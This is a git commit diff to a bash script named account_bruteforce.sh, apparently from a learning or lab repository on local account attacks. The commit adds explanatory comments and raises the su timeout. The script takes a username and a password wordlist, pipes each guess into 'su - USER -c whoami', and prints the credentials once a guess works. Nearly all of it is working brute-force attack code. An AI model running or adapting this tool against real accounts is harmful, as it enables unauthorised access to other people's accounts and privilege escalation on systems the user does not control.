dddad42658d2d779c1ec265f571f92a237fd6982
Bryan Emtman <emtmabry012@gmail.com>
2025-11-29 21:29:27 -0700

    Adjust timeout and enhance comments in bruteforce script
    Updated timeout duration for password attack command and added comments for clarity.

--- Local-Account-Attack/account_bruteforce.sh
+++ Local-Account-Attack/account_bruteforce.sh
@@ -3,11 +3,13 @@
 USER="${1}"
 PASS_FILE="${2}"
 
+# Checks if there are exactly 2 arguments
 if [[ ${#} -ne 2 ]]; then
     echo "Usage: ${0} <username> <password_file>"
     exit 1
 fi
 
+# Checks if the ${PASS_FILE} parameter is a file
 if [[ ! -f ${PASS_FILE} ]]; then
     echo "Error: the argument '${2}' is not a file."
     exit 1
@@ -16,8 +18,12 @@ fi
 echo
 echo "Beginning password attack on: ${USER}"
 
+# Loops through the ${PASS_FILE} line by line
 while read -r password; do
-    if echo "${password}" | timeout 0.2 su - ${USER} -c 'whoami' | grep -q "${USER}"; then
+    # Likely will break on updated systems and if the account username is different than the output of whoami
+    # Inside the if expression is the command to switch users
+    # Command: switch user to ${USER} and call the command whoami, if the command runs and can grep ${USER} from the output if whoami then the password is found
+    if echo "${password}" | timeout 0.5 su - ${USER} -c 'whoami' | grep -q "${USER}"; then
         echo
         echo "Success! Credentials for ${USER} is ${password}"
         echo
